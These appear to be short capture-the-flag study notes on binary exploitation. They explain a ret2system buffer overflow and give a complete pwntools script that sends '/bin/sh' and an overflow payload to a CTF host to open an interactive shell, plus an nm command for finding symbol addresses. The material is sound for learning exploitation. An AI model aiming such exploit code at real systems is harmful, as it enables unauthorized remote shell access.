# Shell
Idea is to find the adress of "system" and call it with a string we chose before (and know the adress of) that will provide the shell.

Example:
```python
import re
import requests
import socket
import string
from pwn import *

systemAddr = 0x080483e0
nameAddr = 0x0804a034

nc = remote('bof102.sstf.site', 1337)

nc.recvuntil(b"Name >")
nc.write(b"/bin/sh\n")
# Variable of length 16 + EBP (32 bits => size 4) + RET (call _puts) + EBP + ARG
payload = b"A"*16 + b"B"*4 + p32(systemAddr) + b"B"*4 + p32(nameAddr)
nc.write(payload + b"\n")

nc.interactive()
```

# nm
List symbols from object files
```bash
# Retrieve static adress of 'callme' inside binary quiz1
nm quiz1 | grep callme
080484eb T callme
```
